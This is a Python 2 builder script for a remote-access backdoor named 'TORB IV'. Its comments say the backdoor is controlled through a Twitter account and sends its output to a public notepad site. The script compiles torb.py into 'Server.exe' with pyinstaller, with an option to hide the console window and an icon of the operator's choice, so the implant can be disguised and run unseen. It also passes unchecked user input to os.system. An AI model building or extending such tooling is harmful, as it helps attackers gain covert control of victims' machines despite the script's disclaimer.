
#  _______  _______  ______    _______        ___   __   __ 
# |       ||       ||    _ |  |  _    |      |   | |  | |  |
# |_     _||   _   ||   | ||  | |_|   |      |   | |  |_|  |
#   |   |  |  | |  ||   |_||_ |       |      |   | |       |
#   |   |  |  |_|  ||    __  ||  _   |       |   | |       |
#   |   |  |       ||   |  | || |_|   |      |   |  |     | 
#   |___|  |_______||___|  |_||_______|      |___|   |___|  
#
# Twitter Operated Remote Backdoor
# Version 4.0

# Input  : https://twitter.com/pyprototype2
# Output : https://anotepad.com/
# Author : Wayne Kenney (LogicPy)

# Instructions:

# 1) Choose whether you want to hide/show the server's console output
# 2) Select an icon for your server's executable
# 3) Compile server to executable

# This software is private

print "\n TORB IV - Personal Remote Operated Backdoor Executable (Private)\n Coded by Wayne Kenney (LogicPy)\n"

print """
                          __..--.._
    .....              .--~  .....  `.
  .":    "`-..  .    .' ..-'"    :". `
  ` `._ ` _.'`"(     `-"'`._ ' _.' '
       ~~~      `.          ~~~
                .'
               /
              (
               ^---'
"""

print "\n Compile 'Server.exe' and select your desired icon.\n"
print " TORB IV is not intended for malicious purposes!"

import os

def visibility():
	w = raw_input("\n Is Form Visibile? (Y/N)> ")
	w = w.lower()
	if w == "y":
		iconSelect("y")
	elif w == "n":
		iconSelect("n")
	else:
		print "\n Invalid Response. Please try again."
		visibility()

def iconSelect(visBool):
	if visBool == "y":
		x = raw_input(" Enter Icon Number> ")
		os.system('pyinstaller --onefile --icon icon/%s.ico torb.py' % (x))
	elif visBool == "n":
		x = raw_input(" Enter Icon Number> ")
		os.system('pyinstaller --onefile --noconsole --icon icon/%s.ico torb.py' % (x))
	print "\n Server Created!\n"


visibility()